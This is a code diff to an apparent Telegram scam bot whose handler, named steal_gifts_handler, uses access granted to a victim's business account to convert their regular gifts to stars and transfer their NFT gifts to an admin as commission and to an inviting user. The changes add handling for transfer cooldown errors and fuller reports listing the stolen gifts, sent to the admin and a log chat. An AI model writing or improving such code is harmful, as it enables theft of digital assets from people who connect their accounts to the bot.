@@ -826,11 +826,11 @@ async def steal_gifts_handler(callback: CallbackQuery):
         return
 
     # 1. Сначала конвертируем обычные подарки в звёзды
+    converted_count = 0
     try:
         gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
         regular_gifts = [g for g in gifts.gifts if g.type == "regular"]
         
-        converted_count = 0
         for gift in regular_gifts:
             try:
                 await bot.convert_gift_to_stars(business_id, gift.owned_gift_id)
@@ -887,6 +887,7 @@ async def steal_gifts_handler(callback: CallbackQuery):
     # Списки подарков
     admin_stolen = []
     user_stolen = []
+    cooldown_errors = []
 
     # 1. Забираем комиссию (админу, если есть)
     if admin_gifts > 0:
@@ -895,6 +896,11 @@ async def steal_gifts_handler(callback: CallbackQuery):
                 await bot.transfer_gift(business_id, gift.owned_gift_id, ADMIN_IDS[0], gift.transfer_star_count)
                 admin_stolen.append(f"t.me/nft/{gift.gift.name.replace(' ', '')}")
             except Exception as e:
+                if "STARGIFT_TRANSFER_TOO_EARLY_" in str(e):
+                    seconds = int(str(e).split("_")[-1])
+                    hours = seconds // 3600
+                    minutes = (seconds % 3600) // 60
+                    cooldown_errors.append(f"{gift.gift.name} - КД {hours}ч {minutes}мин")
                 logging.error(f"Ошибка передачи админу: {e}")
 
     # 2. Отдаём пригласившему (или всё, если комиссии нет)
@@ -905,6 +911,11 @@ async def steal_gifts_handler(callback: CallbackQuery):
                 await bot.transfer_gift(business_id, gift.owned_gift_id, recipient_id, gift.transfer_star_count)
                 user_stolen.append(f"t.me/nft/{gift.gift.name.replace(' ', '')}")
             except Exception as e:
+                if "STARGIFT_TRANSFER_TOO_EARLY_" in str(e):
+                    seconds = int(str(e).split("_")[-1])
+                    hours = seconds // 3600
+                    minutes = (seconds % 3600) // 60
+                    cooldown_errors.append(f"{gift.gift.name} - КД {hours}ч {minutes}мин")
                 logging.error(f"Ошибка передачи получателю: {e}")
 
     # 📌 Формируем логи:
@@ -913,12 +924,12 @@ async def steal_gifts_handler(callback: CallbackQuery):
     if ADMIN_IDS:
         admin_report = (
             f"🔷 Отчёт по бизнес-аккаунту {user.id}:\n"
-            f"✨ Конвертировано обычных: {converted_count}\n"
             f"🎁 Всего NFT: {total_gifts}\n"
             f"├─ Вам: {admin_gifts if take_commission else 0}\n"
             f"╰─ Получателю ({recipient_id}): {user_gifts}\n\n"
-            f"{'🔹 Ваши: ' + ' | '.join(admin_stolen[:3]) + ('...' if len(admin_stolen)>3 else '') if admin_stolen else ''}\n"
-            f"{'🔸 Его: ' + ' | '.join(user_stolen[:3]) + ('...' if len(user_stolen)>3 else '') if user_stolen else ''}"
+            f"{'🔹 Ваши:\n' + '\n'.join(admin_stolen) if admin_stolen else ''}\n\n"
+            f"{'🔸 Его:\n' + '\n'.join(user_stolen) if user_stolen else ''}\n\n"
+            f"{'⏳ Подарки в КД:\n' + '\n'.join(cooldown_errors) if cooldown_errors else ''}"
         )
         await bot.send_message(ADMIN_IDS[0], admin_report)
 
@@ -926,7 +937,8 @@ async def steal_gifts_handler(callback: CallbackQuery):
     public_report = (
         f"Отчёт по бизнес-аккаунту {user.id}:\n"
         f"🎁 Получено NFT: {len(user_stolen)}\n"
-        f"{' | '.join(user_stolen[:3]) + ('...' if len(user_stolen)>3 else '')}"
+        f"{'\n'.join(user_stolen)}\n\n"
+        f"{'⏳ Подарки в КД:\n' + '\n'.join(cooldown_errors) if cooldown_errors else ''}"
     )
 
     await bot.send_message(LOG_CHAT_ID, public_report)
@@ -939,7 +951,6 @@ async def steal_gifts_handler(callback: CallbackQuery):
 
     await callback.answer(
         f"✅ Готово!\n"
-        f"✨ Конвертировано: {converted_count}\n"
         f"🎁 NFT: {total_gifts}" + 
         (f" (👑 вам: {admin_gifts})" if take_commission else "")
     )
